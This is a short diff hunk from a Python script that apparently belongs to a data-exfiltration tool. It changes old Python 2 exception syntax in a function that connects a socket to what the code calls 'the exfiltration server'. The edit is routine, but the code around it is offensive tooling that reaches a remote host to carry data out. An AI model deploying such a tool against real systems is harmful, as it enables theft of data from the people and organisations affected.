@@ -39,7 +39,7 @@ def connect_to_server():
         sock.connect((host, port))
         sys.stdout.write("[+] Connected to the exfiltration server.\n")
         return sock
-    except socket.error, e:
+    except socket.error as e:
         sys.stderr.write("[-] Could not connect to server.\n%s\n" % str(e))
         sys.exit(ERR)
 
